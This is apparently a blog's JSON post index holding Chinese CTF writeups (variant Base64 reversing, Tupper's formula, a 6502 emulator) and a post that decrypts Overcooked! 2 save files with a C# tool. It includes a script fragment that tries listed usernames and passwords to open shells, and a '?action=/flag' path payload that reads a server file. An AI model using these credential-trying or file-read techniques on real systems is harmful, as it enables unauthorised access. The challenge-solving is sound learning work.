flag.txt 确实是一个隐藏文件 26 flag = sh.recvall() 27 if len(flag) != 47: # 如果没有 flag，接收到默认文件名和路径名一共是 47 Bits，有 flag.txt 则会接收到 56 Bits 28 flaglst.append(flag) 29 sususrlst.append(usrlst[i]) 30 suspwdlst.append(pwdlst[i]) 31 shell.close() 32 except: 33 continue 34 excptlst.append(i) 35 36print(flaglst) 37print(sususrlst) 38print(suspwdlst) 39print(excptlst) 由于不知道存储 flag 文件的文件名以及路径，这一脚本只用于筛选可疑用户，找到可疑用户后再手动搜索 flag。不过好在每一道题中都只筛选出了一个可疑用户\n炒鸡常见的编码哇 IDA 打开程序，通过字符串找到程序的核心部分：\n1int sub_40160E() 2{ 3 int v0; // eax 4 int v1; // edx 5 int v2; // eax 6 char v4[9]; // [esp+17h] [ebp-21h] BYREF 7 unsigned int k; // [esp+20h] [ebp-18h] 8 int j; // [esp+24h] [ebp-14h] 9 int i; // [esp+28h] [ebp-10h] 10 int v8; // [esp+2Ch] [ebp-Ch] 11 12 sub_40C270(); 13 v8 = 0; 14 sub_4A3450(\u0026amp;dword_4B0960, \u0026#34;Please input Your flag to start Happy New Year!!\u0026#34;); 15 sub_46AFB0(sub_4A1540); 16 sub_4A4130(\u0026amp;dword_4B0780, Str); 17 dword_4F8924 = 8 * strlen(Str); 18 for ( i = 0; Str[i]; ++i ) 19 { 20 sub_4014BC(Str[i], v4); 21 for ( j = 0; j \u0026lt;= 7; ++j ) 22 { 23 v0 = v8++; 24 byte_4F8120[v0] = v4[j]; 25 } 26 } 27 for ( k = 0; k \u0026lt; dword_4F8924; k += 6 ) 28 { 29 sub_40150A(\u0026amp;byte_4F8120[k]); 30 v1 = sub_4015CA(\u0026amp;byte_4F8120[k]); 31 v2 = dword_4F8A40++; 32 byte_4F8940[v2] = byte_4AF020[v1]; 33 } 34 if ( !memcmp(byte_4F8940, \u0026amp;unk_4AF080, 0x80u) ) 35 sub_4A3450(\u0026amp;dword_4B0960, \u0026#34;Good Job!\u0026#34;); 36 else 37 sub_4A3450(\u0026amp;dword_4B0960, \u0026#34;Try Again!\u0026#34;); 38 sub_46AFB0(sub_4A1540); 39 return 0; 40} 下面是另外三个重要函数 sub_4014BC()、sub_40150A() 与 sub_4015CA() 的定义：\n1int __cdecl sub_4014BC(char a1, int a2) 2{ 3 int result; // eax 4 int i; // [esp+10h] [ebp-4h] 5 6 for ( i = 7; i \u0026gt;= 0; --i ) 7 *(7 - i + a2) = (a1 \u0026gt;\u0026gt; i) \u0026amp; 1; 8 result = a2 + 8; 9 *(a2 + 8) = 0; 10 return result; 11} 12 13int __cdecl sub_40150A(int a1) 14{ 15 int result; // eax 16 int i; // [esp+18h] [ebp-10h] 17 int v3; // [esp+18h] [ebp-10h] 18 int v4; // [esp+1Ch] [ebp-Ch] 19 20 v4 = 0; 21 for ( i = 0; i \u0026lt;= 255; i = v3 + 1 ) 22 { 23 v3 = (i + 1) % 256; 24 v4 = (v3 + v4 + 1) % 256; 25 result = sub_4A1658(v3 % 6 + a1, v4 % 6 + a1); 26 } 27 return result; 28} 29 30int __cdecl sub_4015CA(int a1) 31{ 32 int i; // [esp+4h] [ebp-Ch] 33 int v3; // [esp+8h] [ebp-8h] 34 int v4; // [esp+Ch] [ebp-4h] 35 36 v4 = 0; 37 v3 = 1; 38 for ( i = 5; i \u0026gt;= 0; --i ) 39 { 40 v4 += v3 * *(i + a1); 41 v3 *= 2; 42 } 43 return v4; 44} sub_4014BC() 将输入字符串的每一个字节转化为八位二进制数并存储进新的数组，在 sub_40160E() 中，输入字符串的二进制形式被存储在 byte_4F8120 中，这一转换过程在第一个 for 循环语句中完成。\nsub_4015CA() 将二进制数组六个一组进行编码，在 sub_40160E() 的第二个 for 循环语句中，程序完成了变种 Base64 重新编码的过程。编码表存储在 byte_4AF020 中。\nsub_40150A() 比较难以理解，但是大体能看出是在以六字节个为一组进行改变顺序的操作。经过调试可以知道该函数改变顺序的逻辑：\n调整前索引 调整后索引 0 0 1 2 2 4 3 5 4 3 5 1 具体调试的过程，就是在 byte_4F8120 被调整顺序前，将其修改为由 1 个 1 和 5 个 0 组成的六位二进制数，通过改变 1 的位置查看 sub_40150A() 打乱顺序的方式。\n编码后的字符串存储在 byte_4F8940 中。解题脚本如下：\n1from Crypto.Util.number import * 2 3cipher = [0xE2, 0xF7, 0xD3, 0xE2, 0xC8, 0xB4, 0xD8, 0xC5, 0xCF, 0xB4, 4 0xE7, 0xEE, 0xE1, 0xD9, 0xF1, 0xEF, 0xCB, 0xEB, 0xD9, 0xC9, 5 0xCE, 0xC5, 0xD9, 0xE5, 0xCC, 0xB7, 0xD1, 0xED, 0xE0, 0xB4, 6 0xF1, 0xEE, 0xE0, 0xE7, 0xD2, 0xF6, 0xCB, 0xF3, 0xC9, 0xF3, 7 0xD3, 0xD5, 0xEF] 8table = [0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 9 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3, 10 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xE0, 0xE1, 0xE2, 0xE3, 11 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 12 0xEE, 0xEF, 0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 13 0xF8, 0xF9, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 14 0xB7, 0xB8, 0xAA, 0xAE] 15 16binaries = \u0026#39;\u0026#39; 17for i in cipher: 18 binaries += str(bin(table.index(i)))[2:].rjust(6, \u0026#39;0\u0026#39;) # 将每个编码转成 6 位二进制数 19blst = list(binaries) # 拼接成一个 258 位二进制数 20 21flag = [\u0026#39;N\u0026#39;] * 258 22for i in range(0, 258, 6): # 恢复正确顺序 23 flag[i] = blst[i] 24 flag[i + 1] = blst[i + 2] 25 flag[i + 2] = blst[i + 4] 26 flag[i + 3] = blst[i + 5] 27 flag[i + 4] = blst[i + 3] 28 flag[i + 5] = blst[i + 1] 29 30print(long_to_bytes(int(\u0026#39;\u0026#39;.join(flag)[:-2], 2)).decode()) # 舍弃最后补位的两个 0 31 32# output: NSSCTF{Y0u_4reThe_K1ng_0fBase64} ","link":"https://jackgdn.github.io/post/nss18/","section":"post","tags":["Reverse","Pwn","WP"],"title":"NSSCTF Round#18 WP"},{"body":"","link":"https://jackgdn.github.io/tags/pwn/","section":"tags","tags":null,"title":"Pwn"},{"body":"","link":"https://jackgdn.github.io/tags/c%23/","section":"tags","tags":null,"title":"C#"},{"body":"这两天玩 Overcooked! 2 ，有的关卡因为没有攒够星星玩不了。我花钱买了游戏却不让我往后玩，那我自己改存档吧！\nOvercooked! 2 存档位于 C:\\Users\\{username}\\AppData\\LocalLow\\Team17\\Overcooked2\\{key}\\ 文件夹下。username 是自己的用户名；key 是 Steam 账号的 17 位 SteamID，我的账号的 key 是 76561198849752742。\n不难看出 Overcooked! 2 的存档都是以 .save 作为后缀。诸多游戏厂商都会把自家游戏存档存为 .save 格式。不过这并不是一种通用格式，不同厂商间存储的方式还不一样，有些使用文本文档或者 .json 格式明文存储（例如 Insurgency），有些使用序列化方式存储（例如 Arma3）。Overcooked! 2 的存储方式比较高级：\n它加密了……\nOvercooked! 2 是使用 Unity 引擎开发的游戏，这件事你一打开游戏就能知道。那我不妨把这游戏逆掉。\ndnSpy，启动！\n这样一款游戏，里边出现的类可以说是相当之多了。不过我只需要找到加密和解密存档的代码，因此我选择搜索 \u0026quot;save\u0026quot; 关键词来查找代码。不知道什么原因，开发人员没有使用 Unity 的 Mono Security 来保护代码，这也方便了我逆向。最终我在 GlobalSave 类里找到了极其可疑的代码：\n相关加密解密代码如下：\n1private byte[] Obfuscate(byte[] deobfuscatedText, int size, int start = 0, string salt = \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, string hashFunction = \u0026#34;SHA1\u0026#34;, int keySize = 256) 2{ 3\tif (deobfuscatedText == null || deobfuscatedText.Length == 0 || start + size \u0026gt; deobfuscatedText.Length) 4\t{ 5\treturn null; 6\t} 7\tbyte[] array = new byte[16]; 8\tSystem.Random random = new System.Random(); 9\trandom.NextBytes(array); 10\tbyte[] bytes = new PasswordDeriveBytes(this.GetUniqueId(), Encoding.ASCII.GetBytes(salt), hashFunction, 2).GetBytes(keySize / 8); 11\tRijndaelManaged rijndaelManaged = new RijndaelManaged(); 12\trijndaelManaged.Mode = CipherMode.CBC; 13\tbyte[] array2 = null; 14\ttry 15\t{ 16\tusing (ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(bytes, array)) 17\t{ 18\tusing (MemoryStream memoryStream = new MemoryStream()) 19\t{ 20\tusing (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write)) 21\t{ 22\tcryptoStream.Write(deobfuscatedText, start, size); 23\tcryptoStream.FlushFinalBlock(); 24\tarray2 = memoryStream.ToArray(); 25\tmemoryStream.Close(); 26\tcryptoStream.Close(); 27\t} 28\t} 29\t} 30\t} 31\tcatch (Exception ex) 32\t{ 33\tDebug.LogError(\u0026#34;GlobalSave Obfuscate exception=\u0026#34; + ex.ToString()); 34\treturn null; 35\t} 36\tfinally 37\t{ 38\trijndaelManaged.Clear(); 39\t} 40\tbyte[] array3 = new byte[16 + array2.Length]; 41\tArray.Copy(array, array3, 16); 42\tArray.Copy(array2, 0, array3, 16, array2.Length); 43\treturn array3; 44} 45// 加密部分 46 47private byte[] Deobfuscate(byte[] obfuscatedText, int size, int start = 0, string salt = \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, string hashFunction = \u0026#34;SHA1\u0026#34;, int keySize = 256) 48{ 49\tif (obfuscatedText == null || obfuscatedText.Length == 0 || obfuscatedText.Length \u0026lt;= start + size || obfuscatedText.Length \u0026lt;= 16) 50\t{ 51\treturn null; 52\t} 53\tbyte[] array = new byte[16]; 54\tArray.Copy(obfuscatedText, start, array, 0, 16); 55\tbyte[] array2 = new byte[size - 16 - start]; 56\tArray.Copy(obfuscatedText, 16, array2, 0, array2.Length); 57\tbyte[] bytes = new PasswordDeriveBytes(this.GetUniqueId(), Encoding.ASCII.GetBytes(salt), hashFunction, 2).GetBytes(keySize / 8); 58\tRijndaelManaged rijndaelManaged = new RijndaelManaged(); 59\trijndaelManaged.Mode = CipherMode.CBC; 60\tbyte[] array3 = new byte[array2.Length]; 61\ttry 62\t{ 63\tusing (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(bytes, array)) 64\t{ 65\tusing (MemoryStream memoryStream = new MemoryStream(array2)) 66\t{ 67\tusing (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read)) 68\t{ 69\tcryptoStream.Read(array3, 0, array3.Length); 70\tmemoryStream.Close(); 71\tcryptoStream.Close(); 72\t} 73\t} 74\t} 75\t} 76\tcatch (Exception ex) 77\t{ 78\tDebug.LogError(\u0026#34;GlobalSave Deobfuscate exception=\u0026#34; + ex.ToString()); 79\treturn null; 80\t} 81\tfinally 82\t{ 83\trijndaelManaged.Clear(); 84\t} 85\treturn array3; 86} 87// 解密部分 88 89public byte[] ByteSave() 90{ 91\tstring text = this.ConvertDataToSave(); 92\tif (string.IsNullOrEmpty(text)) 93\t{ 94\treturn null; 95\t} 96\tbyte[] bytes = Encoding.UTF8.GetBytes(text); 97\tbyte[] array = this.Obfuscate(bytes, bytes.Length, 0, \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, \u0026#34;SHA1\u0026#34;, 256); 98\tif (array == null) 99\t{ 100\treturn null; 101\t} 102\tbyte[] bytes2 = BitConverter.GetBytes(CRC32.Calculate(array)); 103\tbyte[] array2 = new byte[array.Length + bytes2.Length]; 104\tArray.Copy(array, array2, array.Length); 105\tArray.Copy(bytes2, 0, array2, array.Length, bytes2.Length); 106\treturn array2; 107} 108// 存储时进行校验 109 110public bool ByteLoad(byte[] _data) 111{ 112\tif (_data == null || (long)_data.Length \u0026lt;= 4L) 113\t{ 114\treturn false; 115\t} 116\tint size = _data.Length - 4; 117\tif (!CRC32.Validate(_data, (uint)size)) 118\t{ 119\treturn false; 120\t} 121\tbyte[] array = this.Deobfuscate(_data, size, 0, \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, \u0026#34;SHA1\u0026#34;, 256); 122\tif (array == null) 123\t{ 124\treturn false; 125\t} 126\tstring @string = Encoding.UTF8.GetString(array); 127\treturn this.ConvertDataFromSave(@string); 128} 129// 读取时进行校验 对于加密函数，经过分析我得到，程序会使用我一开始提到的 key 与密码盐 \u0026quot;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026quot; 使用 PasswordDeriveBytes() 类共同生成密钥，并且随机生成长度为 16 字节的初始化向量 IV。其中，在生成密钥时，程序采用 PBKDF1 算法与 SHA1 算法对密码迭代两次。随后程序依据已知数据，使用 CBC 模式对明文进行 AES 加密（Rijndael 算法）。由于初始化向量是随机生成的，程序将 CRC32 校验码以及初始化向量的 16 个字节写在了存档文件的最前端，方便解密时读取。后面写入被加密的存档文件。此外根据反编译出的 LitJson 命名空间推测明文存档是以 .json 格式读取的。\n程序解读毕。将上述代码复制粘贴后略加修改，即可得到用于加密解密存档的脚本了。修改过的脚本如下：\n1using System; 2using System.Diagnostics; 3using System.IO; 4using System.Net.Security; 5using System.Security.Cryptography; 6using System.Text; 7 8namespace overcooked2 9{ 10 public class CRC32 11 { 12 public const uint c_HashSize = 4u; 13 14 private const uint poly = 1491524015u; 15 16 private const uint seed = 3605721660u; 17 18 private static uint[] s_table; 19 20 private CRC32() 21 { 22 if (s_table == null) 23 { 24 MakeTable(); 25 } 26 } 27 28 protected void MakeTable() 29 { 30 s_table = new uint[256]; 31 for (uint num = 0u; num \u0026lt; 256; num++) 32 { 33 uint num2 = num; 34 for (uint num3 = 0u; num3 \u0026lt; 8; num3++) 35 { 36 num2 = (((num2 \u0026amp; 1) != 1) ? (num2 \u0026gt;\u0026gt; 1) : (num2 ^ 0x58E6D9AF)); 37 } 38 s_table[num] = num2; 39 } 40 } 41 42 public uint CalculateHash(byte[] _data, uint _start, uint _size) 43 { 44 uint num = 3605721660u; 45 for (uint num2 = _start; num2 \u0026lt; _start + _size; num2++) 46 { 47 num = ((num \u0026gt;\u0026gt; 8) ^ s_table[_data[num2] ^ (num \u0026amp; 0xFF)]); 48 } 49 return num; 50 } 51 52 public static void Append(ref byte[] _buffer) 53 { 54 new CRC32().AppendHash(ref _buffer); 55 } 56 57 public void AppendHash(ref byte[] _buffer) 58 { 59 AppendHash(ref _buffer, 0u, (uint)_buffer.Length); 60 } 61 62 public void AppendHash(ref byte[] _buffer, uint _start, uint _size) 63 { 64 AppendHash(ref _buffer, 0u, _size, CalculateHash(_buffer, _start, _size)); 65 } 66 67 public void AppendHash(ref byte[] _buffer, uint _start, uint _size, uint _hash) 68 { 69 byte[] bytes = BitConverter.GetBytes(_hash); 70 if (_buffer.Length \u0026lt; (int)(_start + _size + 4)) 71 { 72 byte[] new_buffer = new byte[_start + _size + 4]; 73 Array.Copy(_buffer, new_buffer, _buffer.Length); 74 _buffer = new_buffer; 75 } 76 int num2 = (int)_size; 77 for (int i = 0; i \u0026lt; bytes.Length; i++) 78 { 79 _buffer[i + num2] = bytes[i]; 80 } 81 } 82 } 83 84 class OC2 85 { 86 private static byte[] Deobfuscate(byte[] obfuscatedText, int size, string key, int start = 0, string salt = \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, string hashFunction = \u0026#34;SHA1\u0026#34;, int keySize = 256) 87 { 88 if (obfuscatedText == null || obfuscatedText.Length == 0 || obfuscatedText.Length \u0026lt;= start + size || obfuscatedText.Length \u0026lt;= 16) 89 { 90 return null; 91 } 92 byte[] array = new byte[16]; 93 Array.Copy(obfuscatedText, start, array, 0, 16); 94 byte[] array2 = new byte[size - 16 - start]; 95 Array.Copy(obfuscatedText, 16, array2, 0, array2.Length); 96 byte[] bytes = new PasswordDeriveBytes(key, Encoding.ASCII.GetBytes(salt), hashFunction, 2).GetBytes(keySize / 8); 97 RijndaelManaged rijndaelManaged = new RijndaelManaged(); 98 rijndaelManaged.Mode = CipherMode.CBC; 99 byte[] array3 = new byte[array2.Length]; 100 try 101 { 102 using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(bytes, array)) 103 { 104 using (MemoryStream memoryStream = new MemoryStream(array2)) 105 { 106 using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read)) 107 { 108 cryptoStream.Read(array3, 0, array3.Length); 109 memoryStream.Close(); 110 cryptoStream.Close(); 111 } 112 } 113 } 114 } 115 catch (Exception ex) 116 { 117 return null; 118 } 119 finally 120 { 121 rijndaelManaged.Clear(); 122 } 123 return array3; 124 } 125 126 private static byte[] Obfuscate(byte[] deobfuscatedText, int size, string key, int start = 0, string salt = \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, string hashFunction = \u0026#34;SHA1\u0026#34;, int keySize = 256) 127 { 128 if (deobfuscatedText == null || deobfuscatedText.Length == 0 || start + size \u0026gt; deobfuscatedText.Length) 129 { 130 return null; 131 } 132 byte[] array = new byte[16]; 133 System.Random random = new System.Random(); 134 random.NextBytes(array); 135 byte[] bytes = new PasswordDeriveBytes(key, Encoding.ASCII.GetBytes(salt), hashFunction, 2).GetBytes(keySize / 8); 136 RijndaelManaged rijndaelManaged = new RijndaelManaged(); 137 rijndaelManaged.Mode = CipherMode.CBC; 138 byte[] array2 = null; 139 try 140 { 141 using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(bytes, array)) 142 { 143 using (MemoryStream memoryStream = new MemoryStream()) 144 { 145 using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write)) 146 { 147 cryptoStream.Write(deobfuscatedText, start, size); 148 cryptoStream.FlushFinalBlock(); 149 array2 = memoryStream.ToArray(); 150 memoryStream.Close(); 151 cryptoStream.Close(); 152 } 153 } 154 } 155 } 156 catch (Exception ex) 157 { 158 return null; 159 } 160 finally 161 { 162 rijndaelManaged.Clear(); 163 } 164 byte[] array3 = new byte[16 + array2.Length]; 165 Array.Copy(array, array3, 16); 166 Array.Copy(array2, 0, array3, 16, array2.Length); 167 return array3; 168 } 169 170 static void Main(string[] args) 171 { 172 string inputfile = args[0]; 173 string steamid = args[1]; 174 byte[] init_data = File.ReadAllBytes(inputfile); 175 if (Path.GetExtension(inputfile) == \u0026#34;.save\u0026#34;) 176 { 177 byte[] final_data = Deobfuscate(init_data, init_data.Length - 4, steamid); 178 string outputfile = Path.ChangeExtension(inputfile, \u0026#34;.json\u0026#34;); 179 File.WriteAllBytes(outputfile, final_data); 180 } 181 else if (Path.GetExtension(inputfile) == \u0026#34;.json\u0026#34;) 182 { 183 byte[] final_data = Obfuscate(init_data, init_data.Length, steamid); 184 string outputfile = Path.ChangeExtension(inputfile, \u0026#34;.save\u0026#34;); 185 CRC32.Append(ref final_data); 186 File.WriteAllBytes(outputfile, final_data); 187 } 188 } 189 } 190} 写好代码后可以尝试管不管用，我用只有 5 颗星的存档 03 做测试。存档 03 这五颗星分别是来自王座室的三颗星和关卡 1-1 的两颗星，其中关卡 1-1 的历史最高得分是 136。\n下面是存放存档的文件夹。不难猜测，CoopSlot_SaveFile_2.save 是我要修改的存档。\n下面两张图依次是解密后格式化前与格式化后的存档文件。如我的猜测，解密后的存档文件果真是 .json 格式：\n看起来还是很奇怪。似乎需要把所有的反斜线都去掉，并且把上下花括号外的引号都去掉才像是正常的 .json 文件。\n确实，现在参数名称和参数值一一对应。除了 NGPEnabled，其他参数都很好理解。那我现在就要把关卡 1-1（LevelID 为 1）的最高分数设为 514，并且三星通关。现在加密并把它重新塞进游戏，看看效果如何。\n特别需要注意的是，最开始我使用 .NET 8.0 运行这个程序，但是在解密时并不能成功；而相同的代码在 .NET 3.1（原程序使用了 .NET 3.5）可以完美运行，不过程序中使用的 Crc32 类（出现于 .NET 6.0）在 .NET 3.1 中不受支持，于是只好再将 Crc32 类的定义代码抄过来。\n","link":"https://jackgdn.github.io/post/%E4%B8%80%E5%B0%8F%E4%BC%99%E8%A7%89%E5%BE%97-overcooked-2-%E5%A4%AA%E9%9A%BE%E4%BA%8E%E6%98%AF%E4%BB%96/","section":"post","tags":["C#","Reverse"],"title":"修改 Overcooked! 2 存档"},{"body":"题量大，题目难度适中，我挑选关键题目写写 WP\nMisc Tupper 先把文件内容提取并拼接起来：\n1txts = [] 2for i in range(0, 673, 4): 3 path = f\u0026#34;{i}.txt\u0026#34; 4 with open(path, \u0026#39;r\u0026#39;) as file: 5 txts.append(file.read()) 6txts = \u0026#39;\u0026#39;.join(txts) 7print(txts) 得到一段 Base64： MTQyNzgxOTM0MzI3MjgwMjYwNDkyOTg1NzQ1NzU1NTc1MzQzMjEwNjIzNDkzNTI1NDM1NjI2NTY3NjY0Njk3MDQwOTI4NzQ2ODgzNTQ2NzkzNzEyMTI0NDQzODIyOTg4MjEzNDIwOTM0NTAzOTg5MDcwOTY5NzYwMDI0NTg4MDc1OTg1MzU3MzUxNzIxMjY2NTc1MDQxMzExNzE2ODQ5MDcxNzMwODY2NTk1MDUxNDM5MjAzMDAwODU4MDg4MDk2NDcyNTY3OTAzODQzNzg1NTM3ODAyODI4OTQyMzk3NTE4OTg2MjAwNDExNDMzODMzMTcwNjQ3MjcxMzY5MDM2MzQ3NzA5MzYzOTg1MTg1NDc5MDA1MTI1NDg0MTk0ODYzNjQ5MTUzOTkyNTM5NDEyNDU5MTEyMDUyNjI0OTM1OTExNTg0OTc3MDgyMTkxMjY0NTM1ODc0NTY2MzczMDI4ODg3MDEzMDMzODIyMTA3NDg2Mjk4MDAwODE4MjE2ODQyODMxODczNjg1NDM2MDE1NTk3Nzg0MzE3MzUwMDY3OTQ3NjE1NDI0MTMwMDY2MjEyMTkyMDczMjI4MDg0NDkyMzIwNTA1Nzg4NTI0MzEzNjE2Nzg3NDUzNTU3NzY5MjExMzIzNTI0MTk5MzE5MDc4MzgyMDUwMDExODQ=\n解码得到一串数：\n14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184\r根据题目名称可以知道与塔伯自指公式有关。用 Tupper's self-referential fomula 解一下：\nwhere is crazyman 系列 三道社工题，前两道用谷歌识图可以直接找到地点；第三道的图片：\n矿泉水瓶子上有 Boudl Apart' Hotel 字样，根据提示在谷歌地图里找到在 Boudl Al Munsiyah 旁的 Starbucks。flag 在谷歌地图里这一家 Starbucks 的评论区里，按时间顺序查看能找到。\ndevil's word 一查是温州话，听音频把“魔鬼的语言”转成数字 0-9，最后十六进制转字符得到 flag。\n发音 数字 leng 0 lia 2 sa 3 sii 4 ng 5 leu 6 cai 7 bo 8 jau 9 使用某些文本编辑器的 Ctrl+H 一键替换的时候注意，不要把 leng 里的 ng 替换成 5。\nreal check in MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2=== 一眼 Base32\nWeb zupload Web 做不了一点，查资料只做了个签到题。本题的后端没有保护，直接改 ?action=/flag 访问 flag 所在目录。\nReverse 红白机 读 6502 汇编。这玩应有现成的在线工具：Easy 6502\n不过还是自己写了个脚本：\n1def op_LDA(arg): 2 global reg_acc, line_ptr 3 reg_acc = int(arg[-3:], 16) 4 line_ptr += 1 5 6 7def op_LDX(arg): 8 global x_index, line_ptr 9 x_index = int(arg[-3:], 16) 10 line_ptr += 1 11 12 13def op_LDY(arg): 14 global y_index, line_ptr 15 y_index = int(arg[-3:], 16) 16 line_ptr += 1 17 18 19def op_STA(arg): 20 global reg_acc, mem, line_ptr, x_index 21 addr = int(arg.split(\u0026#39;,\u0026#39;)[0][1:], 16) + x_index - 0x200 22 mem[addr] = reg_acc 23 line_ptr += 1 24 25 26def op_INX(arg): 27 global x_index, line_ptr 28 x_index += 1 29 line_ptr += 1 30 31 32def op_CPX(arg): 33 global x_index, line_ptr, reg_cmp 34 param = int(arg[-3:], 16) 35 if param == x_index: 36 reg_cmp = 1 37 else: 38 reg_cmp = 0 39 line_ptr += 1 40 41 42def op_BNE(arg): 43 global reg_cmp, line_ptr, seg_addr, seg_name 44 if reg_cmp: 45 line_ptr += 1 46 else: 47 ind = seg_name.index(arg[0]) 48 line_ptr = seg_addr[ind] 49 50 51op_dict = { # 指令 52 \u0026#34;LDA\u0026#34;: op_LDA, 53 \u0026#34;LDX\u0026#34;: op_LDX, 54 \u0026#34;LDY\u0026#34;: op_LDY, 55 \u0026#34;STA\u0026#34;: op_STA, 56 \u0026#34;INX\u0026#34;: op_INX, 57 \u0026#34;CPX\u0026#34;: op_CPX, 58 \u0026#34;BNE\u0026#34;: op_BNE, 59} 60 61 62line_ptr = 0 # 指令地址指针 63seg_addr = [] # 段地址 64seg_name = [] # 段名称 65mem = [0] * 0x400 # 初始化内存 66x_index = 0 # X 索引寄存器 67y_index = 0 # Y 索引寄存器 68reg_acc = 0 # 累加器 69reg_cmp = 0 # 比较标志位 70 71with open(\u0026#34;6502.txt\u0026#34;, \u0026#39;r\u0026#39;) as asm_6502: 72 73 for line in asm_6502: # 读取段标识 74 if line.strip()[0].islower(): 75 seg_addr.append(line_ptr) 76 seg_name.append(line[0]) 77 line_ptr += 1 78 79 line_ptr = 0 # 从头读取 80 asm_6502.seek(0) 81 lines = asm_6502.readlines() 82 83 while line_ptr \u0026lt; 407: # 运行 84 if lines[line_ptr][0].islower(): # 跳过段标识 85 line_ptr += 1 86 else: 87 opcode = lines[line_ptr][0:3] 88 arg = lines[line_ptr][4:] 89 op_dict[opcode](arg) 90 91 for i in range(len(mem)): # 显示 92 if i % 32 == 0: # 显示器宽度 93 print(\u0026#39;\u0026#39;) 94 if mem[i] == 0: 95 print(\u0026#39;.\u0026#39;, end = \u0026#39; \u0026#39;) 96 else: 97 print(\u0026#39;■\u0026#39;, end = \u0026#39; \u0026#39;) 98 99\u0026#39;\u0026#39;\u0026#39;output: 100. ■ ■ . ■ . . . . . . . . . . . ■ ■ . . . . . . . . . . . . . . 101. ■ . . ■ . . . . . . . . . . . ■ . . . ■ . . ■ ■ ■ . . ■ . . . 102■ ■ ■ . ■ . ■ ■ ■ . . ■ ■ ■ . . ■ . . ■ . ■ . ■ . . . ■ . ■ . . 103. ■ . . ■ . ■ . ■ . . ■ . ■ . ■ ■ . . ■ . . . ■ ■ . . ■ . ■ . . 104. ■ . . ■ . ■ ■ ■ ■ . ■ ■ ■ . . ■ . . ■ ■ ■ . . . ■ . ■ . ■ . . 105. . . . . . . . . . . . . ■ . . ■ . . ■ . ■ . . . ■ . ■ . ■ . . 106. . . . . . . . . . . ■ ■ ■ . . ■ ■ . . ■ . . ■ ■ . . . ■ . . . 107. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 108■ ■ ■ . . . . . ■ ■ ■ . . . . . ■ . . . ■ ■ ■ . ■ . ■ . ■ ■ ■ . 109. . ■ . . . . . . ■ . . . . . . ■ . . . ■ . ■ . ■ . ■ . ■ . . . 110. ■ ■ . . . . . . ■ . . . . . . ■ . . . ■ . ■ . ■ . ■ . ■ ■ ■ . 111■ ■ . . . . . . . ■ . . . . . . ■ . . . ■ . ■ . ■ . ■ . ■ . . . 112■ . . . . . . . . ■ . . . . . . ■ . . . ■ . ■ . ■ . ■ . ■ . . . 113■ ■ ■ . ■ ■ ■ . ■ ■ ■ . ■ ■ ■ . ■ ■ ■ . ■ ■ ■ . . ■ . . ■ ■ ■ . 114. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116. . . . . . . . ■ ■ . . . . . . . . . . . . . . . . . . . . . . 117. . . . . . . . . ■ . . . . . . . . . . . . . . . . . . . . . . 118. . . . . . . . . ■ . . . . . . . . . . . . . . . . . . . . . . 119. . . . ■ . ■ . . ■ ■ . . . . . . . . . . . . . . . . . . . . . 120. . . . ■ . ■ . . ■ . . . . . . . . . . . . . . . . . . . . . . 121. . . . ■ . ■ . . ■ . . . . . . . . . . . . . . . . . . . . . . 122■ ■ ■ . ■ ■ ■ . ■ ■ . . . . . . . . . . . . . . . . . . . . . . 123. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 124. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 